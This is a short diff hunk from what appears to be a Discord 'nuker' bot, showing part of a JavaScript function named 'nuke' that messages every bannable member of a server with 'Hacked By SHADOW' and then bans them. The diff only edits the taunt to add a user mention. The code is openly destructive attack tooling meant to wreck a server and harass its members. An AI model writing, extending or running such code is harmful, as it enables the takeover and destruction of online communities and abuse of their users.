@@ -856,7 +856,7 @@ async function nuke(guild) {
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('Hacked By SHADOW ').catch(e => { return void e; });
+      await m.send('Hacked By SHADOW <@318705077734998017> ').catch(e => { return void e; });
       return m.ban();
     }
   }));
